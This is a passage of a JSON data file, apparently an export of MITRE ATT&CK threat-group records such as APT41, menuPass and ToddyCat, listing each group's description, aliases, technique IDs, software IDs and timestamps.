        "T1124",
        "T1201",
        "T1049",
        "T1059.003",
        "T1070.004",
        "T1110.003",
        "T1114.001",
        "T1039",
        "T1119",
        "T1133",
        "T1110.004",
        "T1082",
        "T1114.002",
        "T1012",
        "T1588.002",
        "T1567.002",
        "T1070.006",
        "T1018",
        "T1589.001",
        "T1047",
        "T1021.001",
        "T1111",
        "T1217",
        "T1105"
      ],
      "software": [
        "S0029",
        "S0521",
        "S0404",
        "S0039",
        "S0002",
        "S0154"
      ],
      "url": "https://attack.mitre.org/groups/G0114",
      "stix_id": "intrusion-set--8c1f0187-0826-4320-bddc-5f326cfcfe2c",
      "created": "2020-08-24T17:01:55.842000+00:00",
      "modified": "2024-09-12T19:24:40.416000+00:00"
    },
    "G1018": {
      "id": "G1018",
      "name": "TA2541",
      "description": "[TA2541](https://attack.mitre.org/groups/G1018) is a cybercriminal group that has been targeting the aviation, aerospace, transportation, manufacturing, and defense industries since at least 2017. [TA2541](https://attack.mitre.org/groups/G1018) campaigns are typically high volume and involve the use of commodity remote access tools obfuscated by crypters and themes related to aviation, transportation, and travel.(Citation: Proofpoint TA2541 February 2022)(Citation: Cisco Operation Layover September 2021)",
      "aliases": [
        "TA2541"
      ],
      "techniques": [
        "T1608.001",
        "T1547.001",
        "T1573.002",
        "T1562.001",
        "T1105",
        "T1568",
        "T1036.005",
        "T1518.001",
        "T1053.005",
        "T1027.002",
        "T1082",
        "T1588.001",
        "T1218.005",
        "T1588.002",
        "T1204.001",
        "T1583.001",
        "T1055",
        "T1059.001",
        "T1027.013",
        "T1016.001",
        "T1055.012",
        "T1047",
        "T1204.002",
        "T1059.005",
        "T1566.002",
        "T1027.015",
        "T1566.001",
        "T1583.006"
      ],
      "software": [
        "S0434",
        "S1087",
        "S1086",
        "S0379",
        "S0283",
        "S0670",
        "S0198",
        "S0331",
        "S0385"
      ],
      "url": "https://attack.mitre.org/groups/G1018",
      "stix_id": "intrusion-set--467271fd-47c0-4e90-a3f9-d84f5cf790d0",
      "created": "2023-09-12T17:00:22.615000+00:00",
      "modified": "2024-04-10T22:38:45.199000+00:00"
    },
    "G1022": {
      "id": "G1022",
      "name": "ToddyCat",
      "description": "[ToddyCat](https://attack.mitre.org/groups/G1022) is a sophisticated threat group that has been active since at least 2020 using custom loaders and malware in multi-stage infection chains against government and military targets across Europe and Asia.(Citation: Kaspersky ToddyCat June 2022)(Citation: Kaspersky ToddyCat Check Logs October 2023)",
      "aliases": [
        "ToddyCat"
      ],
      "techniques": [
        "T1005",
        "T1069.002",
        "T1053.005",
        "T1566.003",
        "T1087.002",
        "T1095",
        "T1078.002",
        "T1106",
        "T1057",
        "T1018",
        "T1562.004",
        "T1049",
        "T1021.002",
        "T1059.003",
        "T1190",
        "T1567.002",
        "T1518.001",
        "T1059.001",
        "T1564.003",
        "T1083",
        "T1074.002",
        "T1047",
        "T1036.005",
        "T1082",
        "T1560.001"
      ],
      "software": [
        "S0104",
        "S0097",
        "S0039",
        "S0154",
        "S1101",
        "S0020",
        "S1102",
        "S1099",
        "S1100"
      ],
      "url": "https://attack.mitre.org/groups/G1022",
      "stix_id": "intrusion-set--b516b235-fc7d-4635-aca5-3d33312339c3",
      "created": "2024-01-03T21:34:10.988000+00:00",
      "modified": "2024-02-14T20:35:53.080000+00:00"
    },
    "G1002": {
      "id": "G1002",
      "name": "BITTER",
      "description": "[BITTER](https://attack.mitre.org/groups/G1002) is a suspected South Asian cyber espionage threat group that has been active since at least 2013. [BITTER](https://attack.mitre.org/groups/G1002) has targeted government, energy, and engineering organizations in Pakistan, China, Bangladesh, and Saudi Arabia.(Citation: Cisco Talos Bitter Bangladesh May 2022)(Citation: Forcepoint BITTER Pakistan Oct 2016)",
      "aliases": [
        "BITTER",
        "T-APT-17"
      ],
      "techniques": [
        "T1105",
        "T1071.001",
        "T1588.002",
        "T1568",
        "T1566.001",
        "T1204.002",
        "T1027.013",
        "T1573",
        "T1068",
        "T1036.004",
        "T1608.001",
        "T1559.002",
        "T1203",
        "T1583.001",
        "T1053.005",
        "T1095"
      ],
      "software": [
        "S1013"
      ],
      "url": "https://attack.mitre.org/groups/G1002",
      "stix_id": "intrusion-set--7f848c02-4d1e-4808-a4ae-4670681370a9",
      "created": "2022-06-01T20:26:53.880000+00:00",
      "modified": "2024-04-11T02:52:27.131000+00:00"
    },
    "G0048": {
      "id": "G0048",
      "name": "RTM",
      "description": "[RTM](https://attack.mitre.org/groups/G0048) is a cybercriminal group that has been active since at least 2015 and is primarily interested in users of remote banking systems in Russia and neighboring countries. The group uses a Trojan by the same name ([RTM](https://attack.mitre.org/software/S0148)). (Citation: ESET RTM Feb 2017)",
      "aliases": [
        "RTM"
      ],
      "techniques": [
        "T1189",
        "T1547.001",
        "T1574.001",
        "T1204.002",
        "T1566.001",
        "T1219.002",
        "T1102.001"
      ],
      "software": [
        "S0148"
      ],
      "url": "https://attack.mitre.org/groups/G0048",
      "stix_id": "intrusion-set--c416b28c-103b-4df1-909e-78089a7e0e5f",
      "created": "2017-05-31T21:32:10.206000+00:00",
      "modified": "2025-04-25T14:49:01.288000+00:00"
    },
    "G0045": {
      "id": "G0045",
      "name": "menuPass",
      "description": "[menuPass](https://attack.mitre.org/groups/G0045) is a threat group that has been active since at least 2006. Individual members of [menuPass](https://attack.mitre.org/groups/G0045) are known to have acted in association with the Chinese Ministry of State Security's (MSS) Tianjin State Security Bureau and worked for the Huaying Haitai Science and Technology Development Company.(Citation: DOJ APT10 Dec 2018)(Citation: District Court of NY APT10 Indictment December 2018)\n\n[menuPass](https://attack.mitre.org/groups/G0045) has targeted healthcare, defense, aerospace, finance, maritime, biotechnology, energy, and government sectors globally, with an emphasis on Japanese organizations. In 2016 and 2017, the group is known to have targeted managed IT service providers (MSPs), manufacturing and mining companies, and a university.(Citation: Palo Alto menuPass Feb 2017)(Citation: Crowdstrike CrowdCast Oct 2013)(Citation: FireEye Poison Ivy)(Citation: PWC Cloud Hopper April 2017)(Citation: FireEye APT10 April 2017)(Citation: DOJ APT10 Dec 2018)(Citation: District Court of NY APT10 Indictment December 2018)",
      "aliases": [
        "menuPass",
        "Cicada",
        "POTASSIUM",
        "Stone Panda",
        "APT10",
        "Red Apollo",
        "CVNX",
        "HOGFISH",
        "BRONZE RIVERSIDE"
      ],
      "techniques": [
        "T1018",
        "T1047",
        "T1036",
        "T1070.004",
        "T1046",
        "T1049",
        "T1560.001",
        "T1566.001",
        "T1105",
        "T1588.002",
        "T1204.002",
        "T1090.002",
        "T1078",
        "T1016",
        "T1568.001",
        "T1036.003",
        "T1056.001",
        "T1087.002",
        "T1003.003",
        "T1218.004",
        "T1106",
        "T1003.002",
        "T1027.013",
        "T1199",
        "T1190",
        "T1074.002",
        "T1070.003",
        "T1140",
        "T1553.002",
        "T1053.005",
        "T1055.012",
        "T1074.001",
        "T1021.001",
        "T1039",
        "T1003.004",
        "T1083",
        "T1036.005",
        "T1560",
        "T1059.003",
        "T1005",
        "T1059.001",
        "T1210",
        "T1021.004",
        "T1119",
        "T1583.001",
        "T1574.001"
      ],
      "software": [
        "S0160",
        "S0006",
        "S0002",
        "S0039",
        "S0194",
        "S0106",
        "S0262",
        "S0552",
        "S0404",
        "S0357",
        "S0097",
        "S0029",
        "S0628",
        "S0275",
        "S0159",
        "S0626",
        "S0153",
        "S0627",
        "S0013",
        "S0144",
        "S0154",
        "S0012",
        "S0152",
        "S0624",
        "S1097"
      ],
      "url": "https://attack.mitre.org/groups/G0045",
      "stix_id": "intrusion-set--222fbd21-fc4f-4b7e-9f85-0e6e3a76c33f",
      "created": "2017-05-31T21:32:09.054000+00:00",
      "modified": "2024-11-17T23:19:12.450000+00:00"
    },
    "G0081": {
      "id": "G0081",
      "name": "Tropic Trooper",
      "description": "[Tropic Trooper](https://attack.mitre.org/groups/G0081) is an unaffiliated threat group that has led targeted campaigns against targets in Taiwan, the Philippines, and Hong Kong. [Tropic Trooper](https://attack.mitre.org/groups/G0081) focuses on targeting government, healthcare, transportation, and high-tech industries and has been active since 2011.(Citation: TrendMicro Tropic Trooper Mar 2018)(Citation: Unit 42 Tropic Trooper Nov 2016)(Citation: TrendMicro Tropic Trooper May 2020)",
      "aliases": [
        "Tropic Trooper",
        "Pirate Panda",
        "KeyBoy"
      ],
      "techniques": [
        "T1543.003",
        "T1070.004",
        "T1566.001",
        "T1105",
        "T1057",
        "T1204.002",
        "T1573",
        "T1071.001",
        "T1564.001",
        "T1221",
        "T1033",
        "T1046",
        "T1016",
        "T1052.001",
        "T1547.001",
        "T1505.003",
        "T1573.002",
        "T1059.003",
        "T1106",
        "T1574.001",
        "T1083",
        "T1027.013",
        "T1036.005",
        "T1132.001",
        "T1078.003",
        "T1547.004",
        "T1203",
        "T1071.004",
        "T1119",
        "T1055.001",
        "T1020",
        "T1135",
        "T1082",
        "T1518.001",
        "T1140",
        "T1049",
        "T1027.003",
        "T1518",
        "T1091"
      ],
      "software": [
        "S0190",
        "S0452",
        "S0596",
        "S0012",
        "S0388",
        "S0387"
      ],
      "url": "https://attack.mitre.org/groups/G0081",
      "stix_id": "intrusion-set--56319646-eb6e-41fc-ae53-aadfa7adb924",
      "created": "2019-01-29T20:17:48.717000+00:00",
      "modified": "2024-04-18T18:24:29.185000+00:00"
    },
    "G1020": {
      "id": "G1020",
      "name": "Mustard Tempest",
      "description": "[Mustard Tempest](https://attack.mitre.org/groups/G1020) is an initial access broker that has operated the [SocGholish](https://attack.mitre.org/software/S1124) distribution network since at least 2017. [Mustard Tempest](https://attack.mitre.org/groups/G1020) has partnered with [Indrik Spider](https://attack.mitre.org/groups/G0119) to provide access for the download of additional malware including LockBit, [WastedLocker](https://attack.mitre.org/software/S0612), and remote access tools.(Citation: Microsoft Ransomware as a Service)(Citation: Microsoft Threat Actor Naming July 2023)(Citation: Secureworks Gold Prelude Profile)(Citation: SocGholish-update)",
      "aliases": [
        "Mustard Tempest",
        "DEV-0206",
        "TA569",
        "GOLD PRELUDE",
        "UNC1543"
      ],
      "techniques": [
        "T1583.008",
        "T1608.001",
        "T1036.005",
        "T1566.002",
        "T1584.001",
        "T1608.006",
        "T1608.004",
        "T1189",
        "T1204.001",
        "T1082",
        "T1583.004",
        "T1105"
      ],
      "software": [
        "S1124",
        "S0154"
      ],
      "url": "https://attack.mitre.org/groups/G1020",
      "stix_id": "intrusion-set--0d4ac089-ced4-4cc4-a989-174d08e6d030",
      "created": "2023-12-06T19:00:11.581000+00:00",
      "modified": "2024-03-25T21:23:15.556000+00:00"
    },
    "G0073": {
      "id": "G0073",
      "name": "APT19",
      "description": "[APT19](https://attack.mitre.org/groups/G0073) is a Chinese-based threat group that has targeted a variety of industries, including defense, finance, energy, pharmaceutical, telecommunications, high tech, education, manufacturing, and legal services. In 2017, a phishing campaign was used to target seven law and investment firms. (Citation: FireEye APT19) Some analysts track [APT19](https://attack.mitre.org/groups/G0073) and [Deep Panda](https://attack.mitre.org/groups/G0009) as the same group, but it is unclear from open source information if the groups are the same. (Citation: ICIT China's Espionage Jul 2016) (Citation: FireEye APT Groups) (Citation: Unit 42 C0d0so0 Jan 2016)",
      "aliases": [
        "APT19",
        "Codoso",
        "C0d0so0",
        "Codoso Team",
        "Sunshop Group"
      ],
      "techniques": [
        "T1547.001",
        "T1059.001",
        "T1564.003",
        "T1016",
        "T1033",
        "T1218.011",
        "T1112",
        "T1189",
        "T1543.003",
        "T1071.001",
        "T1059",
        "T1027.013",
        "T1566.001",
        "T1204.002",
        "T1082",
        "T1132.001",
        "T1588.002",
        "T1574.001",
        "T1218.010",
        "T1140",
        "T1027.010"
      ],
      "software": [
        "S0363",
        "S0154"
      ],
      "url": "https://attack.mitre.org/groups/G0073",
      "stix_id": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2024-04-11T03:03:02.576000+00:00"
    },
    "G1009": {
      "id": "G1009",
      "name": "Moses Staff",
      "description": "[Moses Staff](https://attack.mitre.org/groups/G1009) is a suspected Iranian threat group that has primarily targeted Israeli companies since at least September 2021. [Moses Staff](https://attack.mitre.org/groups/G1009) openly stated their motivation in attacking Israeli companies is to cause damage by leaking stolen sensitive data and encrypting the victim's networks without a ransom demand.(Citation: Checkpoint MosesStaff Nov 2021) \n\nSecurity researchers assess [Moses Staff](https://attack.mitre.org/groups/G1009) is politically motivated, and has targeted government, finance, travel, energy, manufacturing, and utility companies outside of Israel as well, including those in Italy, India, Germany, Chile, Turkey, the UAE, and the US.(Citation: Cybereason StrifeWater Feb 2022)",
      "aliases": [
        "Moses Staff",
        "DEV-0500",
        "Marigold Sandstorm"
      ],
      "techniques": [
        "T1021.002",
        "T1016",
        "T1087.001",
        "T1082",
        "T1562.004",
        "T1588.002",
        "T1505.003",
        "T1587.001",
        "T1553.002",
        "T1027.013",
        "T1105",
        "T1190"
      ],
      "software": [
        "S0029",
        "S1032",
        "S1033",
        "S1034"
      ],
      "url": "https://attack.mitre.org/groups/G1009",
      "stix_id": "intrusion-set--4c4a7846-45d5-4761-8eea-725fa989914c",
      "created": "2022-08-11T22:47:27.686000+00:00",
      "modified": "2024-04-11T00:39:25.190000+00:00"
    },
    "G0021": {
      "id": "G0021",
      "name": "Molerats",
      "description": "[Molerats](https://attack.mitre.org/groups/G0021) is an Arabic-speaking, politically-motivated threat group that has been operating since 2012. The group's victims have primarily been in the Middle East, Europe, and the United States.(Citation: DustySky)(Citation: DustySky2)(Citation: Kaspersky MoleRATs April 2019)(Citation: Cybereason Molerats Dec 2020)",
      "aliases": [
        "Molerats",
        "Operation Molerats",
        "Gaza Cybergang"
      ],
      "techniques": [
        "T1218.007",
        "T1204.001",
        "T1105",
        "T1553.002",
        "T1027.015",
        "T1053.005",
        "T1140",
        "T1566.001",
        "T1057",
        "T1566.002",
        "T1555.003",
        "T1547.001",
        "T1059.001",
        "T1059.005",
        "T1059.007",
        "T1204.002"
      ],
      "software": [
        "S0553",
        "S0543",
        "S0062",
        "S0547",
        "S0546",
        "S0012"
      ],
      "url": "https://attack.mitre.org/groups/G0021",
      "stix_id": "intrusion-set--df71bb3b-813c-45eb-a8bc-f2a419837411",
      "created": "2017-05-31T21:31:55.093000+00:00",
      "modified": "2024-11-17T15:50:27.600000+00:00"
    },
    "G0038": {
      "id": "G0038",
      "name": "Stealth Falcon",
      "description": "[Stealth Falcon](https://attack.mitre.org/groups/G0038) is a threat group that has conducted targeted spyware attacks against Emirati journalists, activists, and dissidents since at least 2012. Circumstantial evidence suggests there could be a link between this group and the United Arab Emirates (UAE) government, but that has not been confirmed. (Citation: Citizen Lab Stealth Falcon May 2016)",
      "aliases": [
        "Stealth Falcon"
      ],
      "techniques": [
        "T1555.004",
        "T1059",
        "T1555.003",
        "T1555",
        "T1057",
        "T1016",
        "T1573.001",
        "T1012",
        "T1071.001",
        "T1033",
        "T1047",
        "T1005",
        "T1041",
        "T1059.001",
        "T1053.005",
        "T1082"
      ],
      "software": [],
      "url": "https://attack.mitre.org/groups/G0038",
      "stix_id": "intrusion-set--894aab42-3371-47b1-8859-a4a074c804c8",
      "created": "2017-05-31T21:32:06.390000+00:00",
      "modified": "2025-04-25T14:49:04.710000+00:00"
    },
    "G0105": {
      "id": "G0105",
      "name": "DarkVishnya",
      "description": "[DarkVishnya](https://attack.mitre.org/groups/G0105) is a financially motivated threat actor targeting financial institutions in Eastern Europe. In 2017-2018 the group attacked at least 8 banks in this region.(Citation: Securelist DarkVishnya Dec 2018)",
      "aliases": [
        "DarkVishnya"
      ],
      "techniques": [
        "T1200",
        "T1588.002",
        "T1543.003",
        "T1046",
        "T1135",
        "T1110",
        "T1219",
        "T1059.001",
        "T1040",
        "T1571"
      ],
      "software": [
        "S0191",
        "S0029"
      ],
      "url": "https://attack.mitre.org/groups/G0105",
      "stix_id": "intrusion-set--813636db-3939-4a45-bea9-6113e970c029",
      "created": "2020-05-15T13:07:26.651000+00:00",
      "modified": "2025-04-25T14:49:05.248000+00:00"
    },
    "G0067": {
      "id": "G0067",
      "name": "APT37",
      "description": "[APT37](https://attack.mitre.org/groups/G0067) is a North Korean state-sponsored cyber espionage group that has been active since at least 2012. The group has targeted victims primarily in South Korea, but also in Japan, Vietnam, Russia, Nepal, China, India, Romania, Kuwait, and other parts of the Middle East. [APT37](https://attack.mitre.org/groups/G0067) has also been linked to the following campaigns between 2016-2018: Operation Daybreak, Operation Erebus, Golden Time, Evil New Year, Are you Happy?, FreeMilk, North Korean Human Rights, and Evil New Year 2018.(Citation: FireEye APT37 Feb 2018)(Citation: Securelist ScarCruft Jun 2016)(Citation: Talos Group123)\n\nNorth Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name [Lazarus Group](https://attack.mitre.org/groups/G0032) instead of tracking clusters or subgroups.",
      "aliases": [
        "APT37",
        "InkySquid",
        "ScarCruft",
        "Reaper",
        "Group123",
        "TEMP.Reaper",
        "Ricochet Chollima"
      ],
      "techniques": [
        "T1547.001",
        "T1120",
        "T1059.006",
        "T1105",
        "T1071.001",
        "T1027.003",
        "T1102.002",
        "T1082",
        "T1204.002",
        "T1036.001",
        "T1548.002",
        "T1033",
        "T1555.003",
        "T1529",
        "T1005",
        "T1559.002",
        "T1106",
        "T1203",
        "T1055",
        "T1027",
        "T1189",
        "T1057",
        "T1059",
        "T1059.003",
        "T1566.001",
        "T1123",
        "T1059.005",
        "T1053.005",
        "T1561.002"
      ],
      "software": [
        "S0657",
        "S0212",
        "S0215",
        "S0218",
        "S0240",
        "S0217",
        "S0216",
        "S0214",
        "S0355",
        "S0154",
        "S0247",
        "S0213",
        "S0219"
      ],
      "url": "https://attack.mitre.org/groups/G0067",
      "stix_id": "intrusion-set--4a2ce82e-1a74-468a-a6fb-bbead541383c",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2024-11-17T15:01:33.384000+00:00"
    },
    "G0028": {
      "id": "G0028",
      "name": "Threat Group-1314",
      "description": "[Threat Group-1314](https://attack.mitre.org/groups/G0028) is an unattributed threat group that has used compromised credentials to log into a victim's remote access infrastructure. (Citation: Dell TG-1314)",
      "aliases": [
        "Threat Group-1314",
        "TG-1314"
      ],
      "techniques": [
        "T1021.002",
        "T1059.003",
        "T1072",
        "T1078.002"
      ],
      "software": [
        "S0039",
        "S0029"
      ],
      "url": "https://attack.mitre.org/groups/G0028",
      "stix_id": "intrusion-set--d519164e-f5fa-4b8c-a1fb-cf0172ad0983",
      "created": "2017-05-31T21:31:59.120000+00:00",
      "modified": "2025-04-25T14:49:05.962000+00:00"
    },
    "G0096": {
      "id": "G0096",
      "name": "APT41",
      "description": "[APT41](https://attack.mitre.org/groups/G0096) is a threat group that researchers have assessed as Chinese state-sponsored espionage group that also conducts financially-motivated operations. Active since at least 2012, [APT41](https://attack.mitre.org/groups/G0096) has been observed targeting various industries, including but not limited to healthcare, telecom, technology, finance, education, retail and video game industries in 14 countries.(Citation: apt41_mandiant) Notable behaviors include using a wide range of malware and tools to complete mission objectives. [APT41](https://attack.mitre.org/groups/G0096) overlaps at least partially with public reporting on groups including BARIUM and [Winnti Group](https://attack.mitre.org/groups/G0044).(Citation: FireEye APT41 Aug 2019)(Citation: Group IB APT 41 June 2021)\n",
      "aliases": [
        "APT41",
        "Wicked Panda",
        "Brass Typhoon",
        "BARIUM"
      ],
      "techniques": [
        "T1078",
        "T1082",
        "T1195.002",
        "T1069",
        "T1562.006",
        "T1595.003",
        "T1059.001",
        "T1014",
        "T1087.002",
        "T1555.003",
        "T1036.005",
        "T1543.003",
        "T1071.002",
        "T1018",
        "T1027.002",
        "T1553.002",
        "T1596.005",
        "T1588.002",
        "T1098.007",
        "T1021.002",
        "T1037",
        "T1136.001",
        "T1542.003",
        "T1087.001",
        "T1071.001",
        "T1070.001",
        "T1135",
        "T1599",
        "T1480.001",
        "T1484.001",
        "T1595.002",
        "T1005",
        "T1133",
        "T1070.004",
        "T1566.001",
        "T1053.005",
        "T1547.001",
        "T1546.008",
        "T1110",
        "T1550.002",
        "T1574.006",
        "T1059.003",
        "T1003.002",
        "T1568.002",
        "T1569.002",
        "T1071.004",
        "T1046",
        "T1560.001",
        "T1218.011",
        "T1102.001",
        "T1008",
        "T1555",
        "T1496.001",
        "T1003.003",
        "T1049",
        "T1059.004",
        "T1486",
        "T1016",
        "T1033",
        "T1105",
        "T1203",
        "T1218.001",
        "T1112",
        "T1090",
        "T1003.001",
        "T1213.003",
        "T1197",
        "T1012",
        "T1083",
        "T1656",
        "T1055",
        "T1021.001",
        "T1190",
        "T1570",
        "T1027",
        "T1104",
        "T1030",
        "T1047",
        "T1056.001",
        "T1070.003",
        "T1036.004",
        "T1574.001",
        "T1102",
        "T1213",
        "T1543.003",
        "T1070.004",
        "T1105",
        "T1505.003",
        "T1593.002",
        "T1588.003",
        "T1586.003",
        "T1119",
        "T1027.013",
        "T1074.001",
        "T1567.002",
        "T1036.004",
        "T1596.005",
        "T1574.001",
        "T1569.002",
        "T1560.001",
        "T1071.001",
        "T1594",
        "T1583.007",
        "T1573.002",
        "T1553.002",
        "T1082",
        "T1027.002",
        "T1033",
        "T1036.004",
        "T1016",
        "T1053.005",
        "T1190",
        "T1505.003",
        "T1140",
        "T1003.002",
        "T1027",
        "T1041",
        "T1048.003",
        "T1074.001",
        "T1071.001",
        "T1005",
        "T1102.001",
        "T1059.007",
        "T1574",
        "T1090",
        "T1036.005",
        "T1059.003",
        "T1001.003",
        "T1134",
        "T1567",
        "T1560.003",
        "T1588.002",
        "T1105",
        "T1102"
      ],
      "software": [
        "S0190",
        "S0357",
        "S0104",
        "S0194",
        "S0097",
        "S0039",
        "S0100",
        "S0225",
        "S0002",
        "S0160",
        "S0363",
        "S0006",
        "S0105",
        "S0095",
        "S0073",
        "S0013",
        "S0032",
        "S0412",
        "S1051",
        "S1185",
        "S1158",
        "S0020",
        "S0596",
        "S0443",
        "S0385",
        "S0154",
        "S0069",
        "S0112",
        "S0430",
        "S1159",
        "S0021",
        "S0160",
        "S1159",
        "S0154",
        "S1158",
        "S0105",
        "S0002",
        "S0097",
        "S0154",
        "S1051",
        "S1052"
      ],
      "url": "https://attack.mitre.org/groups/G0096",
      "stix_id": "intrusion-set--18854f55-ac7c-4634-bd9a-352dd07613b7",
      "created": "2019-09-23T13:43:36.945000+00:00",
      "modified": "2025-04-22T21:56:33.318000+00:00"
    },
    "G1032": {
      "id": "G1032",
      "name": "INC Ransom",
      "description": "[INC Ransom](https://attack.mitre.org/groups/G1032) is a ransomware and data extortion threat group associated with the deployment of [INC Ransomware](https://attack.mitre.org/software/S1139) that has been active since at least July 2023. [INC Ransom](https://attack.mitre.org/groups/G1032)  has targeted organizations worldwide most commonly in the industrial, healthcare, and education sectors in the US and Europe.(Citation: Bleeping Computer INC Ransomware March 2024)(Citation: Cybereason INC Ransomware November 2023)(Citation: Secureworks GOLD IONIC April 2024)(Citation: SentinelOne INC Ransomware)",
      "aliases": [
        "INC Ransom",
        "GOLD IONIC"
      ],
      "techniques": [
        "T1486",
        "T1562.001",
        "T1021.001",
        "T1657",
        "T1047",
        "T1566",
        "T1059.003",
        "T1537",
        "T1087.002",
        "T1074",
        "T1071",
        "T1046",
        "T1569.002",
        "T1219",
        "T1588.002",
        "T1036.005",
        "T1570",
        "T1069.002",
        "T1135",
        "T1190",
        "T1070.004",
        "T1078",
        "T1105",
        "T1560.001",
        "T1049"
      ],
      "software": [
        "S0183",
        "S0029",
        "S0359",
        "S1040",
        "S0552",
        "S0039",
        "S0404",
        "S1139"
      ],
      "url": "https://attack.mitre.org/groups/G1032",
      "stix_id": "intrusion-set--cb41e991-65f4-4668-a65f-f4200545b5a1",
      "created": "2024-06-06T17:16:38.704000+00:00",
      "modified": "2024-10-28T19:03:08.838000+00:00"
    },
    "G1016": {
      "id": "G1016",
      "name": "FIN13",
      "description": "[FIN13](https://attack.mitre.org/groups/G1016) is a financially motivated cyber threat group that has targeted the financial, retail, and hospitality industries in Mexico and Latin America, as early as 2016. [FIN13](https://attack.mitre.org/groups/G1016) achieves its objectives by stealing intellectual property, financial data, mergers and acquisition information, or PII.(Citation: Mandiant FIN13 Aug 2022)(Citation: Sygnia Elephant Beetle Jan 2022)",
      "aliases": [
        "FIN13",
        "Elephant Beetle"
      ],
      "techniques": [
        "T1587.001",
        "T1078.001",
        "T1572",
        "T1021.006",
        "T1133",
        "T1087.002",
        "T1046",
        "T1505.003",
        "T1082",
        "T1016",
        "T1090.001",
        "T1565",
        "T1059.001",
        "T1053.005",
        "T1136.001",
        "T1003.002",
        "T1003.003",
        "T1190",
        "T1589",
        "T1036.004",
        "T1021.002",
        "T1003.001",
        "T1564.001",
        "T1552.001",
        "T1657",
        "T1588.002",
        "T1134.003",
        "T1105",
        "T1071.001",
        "T1550.002",
        "T1059.003",
        "T1547.001",
        "T1016.001",
        "T1036",
        "T1059.005",
        "T1098.007",
        "T1574.001",
        "T1021.001",
        "T1590.004",
        "T1135",
        "T1560.001",
        "T1140",
        "T1556",
        "T1047",
        "T1021.004",
        "T1074.001",
        "T1056.001",
        "T1036.005",
        "T1049",
        "T1083",
        "T1005",
        "T1069",
        "T1087"
      ],
      "software": [
        "S0357",
        "S0002",
        "S0363",
        "S0160"
      ],
      "url": "https://attack.mitre.org/groups/G1016",
      "stix_id": "intrusion-set--fd66436e-4d33-450e-ac4c-f7810f1c85f4",
      "created": "2023-07-27T15:24:02.162000+00:00",
      "modified": "2023-09-29T19:08:47.861000+00:00"
    },
    "G0043": {
      "id": "G0043",
      "name": "Group5",
      "description": "[Group5](https://attack.mitre.org/groups/G0043) is a threat group with a suspected Iranian nexus, though this attribution is not definite. The group has targeted individuals connected to the Syrian opposition via spearphishing and watering holes, normally using Syrian and Iranian themes. [Group5](https://attack.mitre.org/groups/G0043) has used two commonly available remote access tools (RATs), [njRAT](https://attack.mitre.org/software/S0385) and [NanoCore](https://attack.mitre.org/software/S0336), as well as an Android RAT, DroidJack. (Citation: Citizen Lab Group5)",
      "aliases": [
        "Group5"
      ],
      "techniques": [
        "T1056.001",
        "T1113",
        "T1070.004",
        "T1027.013"
      ],
      "software": [
        "S0385",
        "S0336"
      ],
      "url": "https://attack.mitre.org/groups/G0043",
      "stix_id": "intrusion-set--7331c66a-5601-4d3f-acf6-ad9e3035eb40",
      "created": "2017-05-31T21:32:08.304000+00:00",
      "modified": "2024-04-11T02:23:59.598000+00:00"
    },
    "G0068": {
      "id": "G0068",
      "name": "PLATINUM",
      "description": "[PLATINUM](https://attack.mitre.org/groups/G0068) is an activity group that has targeted victims since at least 2009. The group has focused on targets associated with governments and related organizations in South and Southeast Asia. (Citation: Microsoft PLATINUM April 2016)",
      "aliases": [
        "PLATINUM"
      ],
      "techniques": [
        "T1189",
        "T1105",
        "T1204.002",
        "T1068",
        "T1056.004",
        "T1056.001",
        "T1003.001",
        "T1095",
        "T1055",
        "T1566.001",
        "T1036"
      ],
      "software": [
        "S0201",
        "S0200",
        "S0202"
      ],
      "url": "https://attack.mitre.org/groups/G0068",
      "stix_id": "intrusion-set--f9c06633-dcff-48a1-8588-759e7cec5694",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-25T14:49:07.040000+00:00"
    },
    "G0093": {
      "id": "G0093",
      "name": "GALLIUM",
      "description": "[GALLIUM](https://attack.mitre.org/groups/G0093) is a cyberespionage group that has been active since at least 2012, primarily targeting telecommunications companies, financial institutions, and government entities in Afghanistan, Australia, Belgium, Cambodia, Malaysia, Mozambique, the Philippines, Russia, and Vietnam. This group is particularly known for launching Operation Soft Cell, a long-term campaign targeting telecommunications providers.(Citation: Cybereason Soft Cell June 2019) Security researchers have identified [GALLIUM](https://attack.mitre.org/groups/G0093) as a likely Chinese state-sponsored group, based in part on tools used and TTPs commonly associated with Chinese threat actors.(Citation: Cybereason Soft Cell June 2019)(Citation: Microsoft GALLIUM December 2019)(Citation: Unit 42 PingPull Jun 2022)",
      "aliases": [
        "GALLIUM",
        "Granite Typhoon"
      ],
      "techniques": [
        "T1059.003",
        "T1003.002",
        "T1078",
        "T1053.005",
        "T1027",
        "T1553.002",
        "T1041",
        "T1005",
        "T1574.001",
        "T1588.002",
        "T1047",
        "T1136.002",
        "T1583.004",
        "T1133",
        "T1027.002",
        "T1505.003",
        "T1003.001",
        "T1560.001",
        "T1059.001",
        "T1570",
        "T1027.005",
        "T1090.002",
        "T1049",
        "T1074.001",
        "T1033",
        "T1190",
        "T1016",
        "T1105",
        "T1018",
        "T1550.002",
        "T1036.003"
      ],
      "software": [
        "S0100",
        "S0097",
        "S0106",
        "S0110",
        "S0002",
        "S0039",
        "S0075",
        "S0029",
        "S0040",
        "S0590",
        "S0005",
        "S0020",
        "S0012",
        "S0013",
        "S1031",
        "S0564"
      ],
      "url": "https://attack.mitre.org/groups/G0093",
      "stix_id": "intrusion-set--06a11b7e-2a36-47fe-8d3e-82c265df3258",
      "created": "2019-07-18T20:47:50.050000+00:00",
      "modified": "2024-04-17T22:10:27.139000+00:00"
    },
    "G0051": {
      "id": "G0051",
      "name": "FIN10",
      "description": "[FIN10](https://attack.mitre.org/groups/G0051) is a financially motivated threat group that has targeted organizations in North America since at least 2013 through 2016. The group uses stolen data exfiltrated from victims to extort organizations. (Citation: FireEye FIN10 June 2017)",
      "aliases": [
        "FIN10"
      ],
      "techniques": [
        "T1070.004",
        "T1570",
        "T1033",
        "T1059.003",
        "T1078.003",
        "T1547.001",
        "T1053.005",
        "T1588.002",
        "T1021.001",
        "T1059.001",
        "T1078"
      ],
      "software": [
        "S0363"
      ],
      "url": "https://attack.mitre.org/groups/G0051",
      "stix_id": "intrusion-set--fbe9387f-34e6-4828-ac28-3080020c597b",
      "created": "2017-12-14T16:46:06.044000+00:00",
